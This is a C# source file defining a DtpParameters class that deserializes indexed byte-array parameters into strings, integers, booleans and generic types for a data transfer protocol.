using System;
using System.Collections.Generic;
using Orcus.Shared.NetSerializer;

namespace Orcus.Shared.DataTransferProtocol
{
    /// <summary>
    ///     Parameters given on execution
    /// </summary>
    public class DtpParameters
    {
        private readonly Dictionary<int, byte[]> _rawParameters;

        internal DtpParameters(Dictionary<int, byte[]> rawParameters)
        {
            _rawParameters = rawParameters;
        }

        /// <summary>
        ///     Get a <see cref="string" /> from the given position
        /// </summary>
        /// <param name="offset">The index of the parameter</param>
        /// <returns>The deserialized string</returns>
        public string GetString(int offset)
        {
            return GetValue<string>(offset, null);
        }

        /// <summary>
        ///     Get an <see cref="int" /> from the given position
        /// </summary>
        /// <param name="offset">The index of the parameter</param>
        /// <returns>The deserialized integer</returns>
        public int GetInt32(int offset)
        {
            return GetValue<int>(offset, null);
        }

        /// <summary>
        ///     Get a <see cref="bool" /> from the given position
        /// </summary>
        /// <param name="offset">The index of the parameter</param>
        /// <returns>The deserialized boolean</returns>
        public bool GetBool(int offset)
        {
            return GetValue<bool>(offset, null);
        }

        /// <summary>
        ///     Deserialize the parameter at the given index
        /// </summary>
        /// <typeparam name="T">The type of the value</typeparam>
        /// <param name="offset">The index of the parameter</param>
        /// <param name="deserializationTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the return value
        ///     in order to serialize it correctly
        /// </param>
        /// <returns>Returns the deserialized object</returns>
        public T GetValue<T>(int offset, params Type[] deserializationTypes)
        {
            var types = new List<Type> {typeof (T)};
            if (deserializationTypes != null && deserializationTypes.Length > 0)
                types.AddRange(deserializationTypes);
            return new Serializer(types).Deserialize<T>(_rawParameters[offset]);
        }

        /// <summary>
        ///     Deserialize the parameter at the given index
        /// </summary>
        /// <param name="offset">The index of the parameter</param>
        /// <param name="valueType">The type of the value</param>
        /// <param name="deserializationTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the return value
        ///     in order to serialize it correctly
        /// </param>
        /// <returns>Returns the deserialized object</returns>
        public object GetValue(int offset, Type valueType, params Type[] deserializationTypes)
        {
            var types = new List<Type> {valueType};
            if (deserializationTypes != null && deserializationTypes.Length > 0)
                types.AddRange(deserializationTypes);
            return new Serializer(types).Deserialize(_rawParameters[offset], 0);
        }

        /// <summary>
        ///     Deserialize the parameter at the index
        /// </summary>
        /// <typeparam name="T">The type of the value</typeparam>
        /// <param name="offset">The index of the parameter</param>
        /// <returns>Returns the deserialized object</returns>
        public T GetValue<T>(int offset)
        {
            return GetValue<T>(offset, null);
        }
    }
}